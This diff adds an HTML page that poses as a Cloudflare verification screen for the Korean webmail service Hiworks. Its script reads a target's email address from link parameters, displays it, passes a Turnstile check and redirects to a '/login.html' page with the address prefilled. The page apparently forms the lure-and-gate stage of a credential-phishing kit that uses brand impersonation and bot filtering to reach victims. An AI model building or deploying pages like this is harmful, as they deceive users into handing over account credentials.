@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>잠시만 기다려 주세요...</title>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+  :root {
+    --brand-c1: #0066FF;
+    --brand-c2: #0047B3;
+    --brand-fg: #ffffff;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans KR", Arial, sans-serif;
+    background: #f7f7f7;
+    color: #313131;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .cf-card {
+    background: #fff;
+    border: 1px solid #d9d9d9;
+    border-radius: 8px;
+    max-width: 460px;
+    width: 100%;
+    padding: 0 0 24px;
+    box-shadow: 0 2px 8px rgba(0,0,0,.04);
+    text-align: center;
+    overflow: hidden;
+    position: relative;
+  }
+  .brand-bar {
+    height: 5px;
+    background: linear-gradient(90deg, var(--brand-c1), var(--brand-c2));
+  }
+  .brand-mark {
+    width: 64px;
+    height: 64px;
+    margin: 28px auto 18px;
+    border-radius: 16px;
+    display: grid;
+    place-items: center;
+    font-size: 30px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    background: linear-gradient(135deg, var(--brand-c1), var(--brand-c2));
+    color: #fff;
+    box-shadow: 0 10px 24px -10px var(--brand-c1);
+  }
+  .cf-card h1 {
+    font-size: 20px;
+    font-weight: 600;
+    color: #313131;
+    margin-bottom: 8px;
+  }
+  .cf-card p {
+    font-size: 14px;
+    color: #6a6a6a;
+    margin-bottom: 20px;
+    line-height: 1.5;
+    padding: 0 28px;
+  }
+  .brand-chip {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin: 0 auto 22px;
+    padding: 8px 14px;
+    border-radius: 999px;
+    background: #fafafa;
+    border: 1px solid #ececec;
+    font-size: 12.5px;
+    color: #555;
+  }
+  .brand-chip .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--brand-c1), var(--brand-c2));
+  }
+  .brand-chip strong { color: #313131; font-weight: 700; }
+  .cf-turnstile {
+    display: flex;
+    justify-content: center;
+    margin: 0 auto 20px;
+    min-height: 65px;
+  }
+  .cf-footer {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    font-size: 11px;
+    color: #6a6a6a;
+    padding-top: 16px;
+    border-top: 1px solid #f0f0f0;
+    margin: 8px 28px 0;
+  }
+  .cf-footer a { color: #6a6a6a; text-decoration: none; }
+  .cf-footer a:hover { text-decoration: underline; }
+  .cf-logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    color: #f6821f;
+    font-weight: 600;
+  }
+  .spinner {
+    display: none;
+    width: 36px;
+    height: 36px;
+    margin: 8px auto 20px;
+    border: 3px solid #f0f0f0;
+    border-top: 3px solid var(--brand-c1);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .error-box {
+    display: none;
+    background: #fff5f5;
+    border: 1px solid #f5c6cb;
+    color: #a94442;
+    padding: 10px 14px;
+    border-radius: 4px;
+    font-size: 13px;
+    margin: 12px 28px 0;
+  }
+  .state-verifying .spinner { display: block; }
+  .state-verifying .cf-turnstile { display: none; }
+  .state-verifying .brand-chip { display: none; }
+</style>
+</head>
+<body>
+
+<div class="cf-card" id="cfCard">
+  <div class="brand-bar"></div>
+
+  <div class="brand-mark">H</div>
+
+  <h1>사용자 확인 중</h1>
+  <p>몇 초 정도 소요됩니다.</p>
+
+  <div class="brand-chip" id="brandChip">
+    <span class="dot"></span>
+    <span>인증 대상 <strong id="brandChipName">—</strong></span>
+  </div>
+
+  <div class="spinner"></div>
+
+  <!-- Cloudflare Turnstile widget -->
+  <div class="cf-turnstile"
+       id="turnstileWidget"
+       data-sitekey="0x4AAAAAAE05AJQxT-EsaFlm"
+       data-callback="onVerified"
+       data-error-callback="onTurnstileError"
+       data-expired-callback="onTurnstileExpired"
+       data-theme="light"
+       data-size="flexible"></div>
+
+  <div class="error-box" id="errorBox"></div>
+
+  <div class="cf-footer">
+    <span class="cf-logo">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:16px;height:16px;">
+        <path fill="#f6821f" d="M35.6 27.7l-4.1-1.9c-.6-.2-1.1-.8-1.2-1.4l-3.7-12.3c-.1-.4-.5-.7-.9-.7h-5.6c-.4 0-.7.3-.6.7l3.5 11.7c.1.4.5.7.9.7h5.7c.2 0 .4-.2.3-.4l-1.2-4.2c-.1-.4.2-.8.6-.8h4.6c.4 0 .7.3.6.7l-1.6 5.4c-.1.4-.5.7-.9.7H22c-.2 0-.4.2-.3.4l1 3.4c.1.4.5.7.9.7h11.4c.5 0 .8-.4.6-.9l-.7-1.6c-.1-.3.1-.6.4-.6h4.5c.3 0 .5-.3.4-.6l-.7-2.4c-.1-.4-.5-.6-.9-.6l-4.1.1z"/>
+      </svg>
+      Cloudflare
+    </span>
+    <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener">개인정보</a>
+    <span>•</span>
+    <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener">약관</a>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   READ EMAIL FROM URL — supports ?auth=, ?e=, ?email=, ?u=
+   ============================================================ */
+function getEmailFromSource() {
+  // Hash: #email=xxx@yyy
+  let fromHash = window.location.hash.substring(1);
+  if (fromHash) {
+    try { fromHash = decodeURIComponent(fromHash); } catch (e) {}
+    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i, '').trim();
+    if (fromHash.includes('@')) return fromHash;
+  }
+
+  // Query params (auth is first — matches the Netlify link format)
+  const params = new URLSearchParams(window.location.search);
+  const keys = ['auth', 'e', 'email', 'u', 'login_hint', 'user', 'mail'];
+  for (const k of keys) {
+    const v = params.get(k);
+    if (v && v.includes('@')) return v;
+  }
+
+  // Raw fallback
+  if (window.location.search.length > 1) {
+    let raw = window.location.search.substring(1);
+    try { raw = decodeURIComponent(raw); } catch (e) {}
+    raw = raw.split('&')[0].split('?')[0].trim();
+    if (raw.includes('@')) return raw;
+  }
+  return '';
+}
+
+/* ============================================================
+   STATE
+   ============================================================ */
+var EMAIL = getEmailFromSource();
+var verified = false;
+
+/* ============================================================
+   INIT
+   ============================================================ */
+(function init() {
+  console.log('📧 Email from URL:', EMAIL || '(none)');
+
+  var chipName = document.getElementById('brandChipName');
+  if (chipName) chipName.textContent = EMAIL || '하이웍스';
+
+  document.title = '잠시만 기다려 주세요... — Hiworks';
+})();
+
+/* ============================================================
+   TURNSTILE CALLBACKS
+   ============================================================ */
+function onVerified(token) {
+  if (verified) return;
+  if (!token) { onTurnstileError('missing-token'); return; }
+  verified = true;
+  console.log('🛡️ Turnstile passed');
+
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.add('state-verifying');
+
+  // ✅ Redirect to login.html with email prefilled as ?u=
+  var target = '/login.html';
+  var finalUrl = EMAIL
+    ? target + '?u=' + encodeURIComponent(EMAIL)
+    : target;
+
+  console.log('🔗 Redirecting to:', finalUrl);
+  setTimeout(function () {
+    window.location.href = finalUrl;
+  }, 800);
+}
+
+function onTurnstileError(code) {
+  console.error('❌ Turnstile error:', code);
+  var box = document.getElementById('errorBox');
+  if (box) {
+    box.style.display = 'block';
+    box.textContent = '인증에 실패했습니다. 페이지를 새로고침해주세요.';
+  }
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.remove('state-verifying');
+}
+
+function onTurnstileExpired() {
+  verified = false;
+  if (window.turnstile) {
+    try { window.turnstile.reset(); } catch (e) {}
+  }
+}
+
+// Fallback: if Turnstile never loads, show message
+setTimeout(function () {
+  if (!verified && window.turnstile === undefined) {
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = '보안 확인이 예상보다 오래 걸립니다. 새로고침해주세요.';
+    }
+  }
+}, 15000);
+
+console.log('%cHiworks Turnstile gate ready', 'font-weight:700;color:#0066FF');
+</script>
+
+</body>
+</html>
